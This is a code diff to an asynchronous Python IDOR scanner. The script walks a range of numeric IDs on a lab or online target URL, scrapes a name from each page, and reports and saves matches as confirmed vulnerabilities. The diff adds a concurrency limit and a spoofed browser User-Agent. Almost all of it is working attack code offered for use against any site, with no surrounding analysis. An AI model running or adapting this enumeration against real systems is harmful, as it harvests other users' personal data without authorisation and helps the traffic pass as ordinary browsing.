@@ -21,6 +21,8 @@ async def main():
             ValueError: If non-integer values are provided for ID range boundaries.
             Exception: Captures and logs errors during the file-writing process.
         """
+    semaphore = asyncio.Semaphore(10)
+
     print_banner()
     print(f"1. Local Lab (127.0.0.1)\n2. Online Target")
 
@@ -52,7 +54,7 @@ async def main():
 
     # Async execution
     async with aiohttp.ClientSession() as session:
-        tasks = [check_id(session, base_url, uid) for uid in range(start_id, end_id + 1)]
+        tasks = [check_id(session, base_url, uid, semaphore) for uid in range(start_id, end_id + 1)]
         results_raw = await asyncio.gather(*tasks)
 
     # Filter out None results
@@ -78,7 +80,7 @@ async def main():
         print(f"\n{Fore.WHITE}[?] No vulnerabilities found to save.")
 
 
-async def check_id(session, base_url, uid):
+async def check_id(session, base_url, uid, semaphore):
     """
         Performs an asynchronous HTTP GET request to verify a specific ID for IDOR vulnerabilities.
 
@@ -99,31 +101,32 @@ async def check_id(session, base_url, uid):
         - Handles aiohttp-specific exceptions (ClientConnectorError, TimeoutError) to
           ensure the global scan loop remains uninterrupted.
         """
-    try:
-        async with session.get(f"{base_url}{uid}", timeout=5) as res:
-            if res.status == 200:
-                html = await res.text()
-                soup = BeautifulSoup(html, 'html.parser')
-                name_tag = soup.find('span', style="margin-left:2px;")
-                name = name_tag.get_text(strip=True) if name_tag else ""
-
-                if name:
-                    print(f"{Fore.GREEN}[+] Vulnerability IDOR CONFIRMED! ID {uid}: {name}")
-                    return f"{uid} = {name}"
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+    async with semaphore:
+        try:
+            async with session.get(f"{base_url}{uid}", headers=headers, timeout=5) as res:
+                if res.status == 200:
+                    html = await res.text()
+                    soup = BeautifulSoup(html, 'html.parser')
+                    name_tag = soup.find('span', style="margin-left:2px;")
+                    name = name_tag.get_text(strip=True) if name_tag else ""
+                    if name:
+                        print(f"{Fore.GREEN}[+] Vulnerability IDOR CONFIRMED! ID {uid}: {name}")
+                        return f"{uid} = {name}"
+                    else:
+                        print(f"{Fore.WHITE}[.] ID {uid}: Page empty or data missing.")
+                elif res.status == 404:
+                    print(f"{Fore.YELLOW}[-] ID {uid}: 404 Not Found.")
                 else:
-                    print(f"{Fore.WHITE}[.] ID {uid}: Page empty or data missing.")
-            elif res.status == 404:
-                print(f"{Fore.YELLOW}[-] ID {uid}: 404 Not Found.")
-            else:
-                print(f"{Fore.YELLOW}[?] ID {uid}: Received status code {res.status}")
+                    print(f"{Fore.YELLOW}[?] ID {uid}: Received status code {res.status}")
 
-    except aiohttp.ClientConnectorError:
-        print(f"{Fore.RED}\n[!] Connection Error at ID {uid}. Check if the server is running.")
-    except asyncio.TimeoutError:
-        print(f"{Fore.RED}\n[!] Request Timeout at ID {uid}.")
-    except Exception as e:
-        print(f"{Fore.RED}[!] An unexpected error occurred at ID {uid}: {e}")
-    return None
+        except aiohttp.ClientConnectorError:
+            print(f"{Fore.RED}\n[!] Connection Error at ID {uid}. Check if the server is running.")
+        except asyncio.TimeoutError:
+            print(f"{Fore.RED}\n[!] Request Timeout at ID {uid}.")
+        except Exception as e:
+            print(f"{Fore.RED}[!] An unexpected error occurred at ID {uid}: {e}")
+        return None
 
 
 def print_banner():
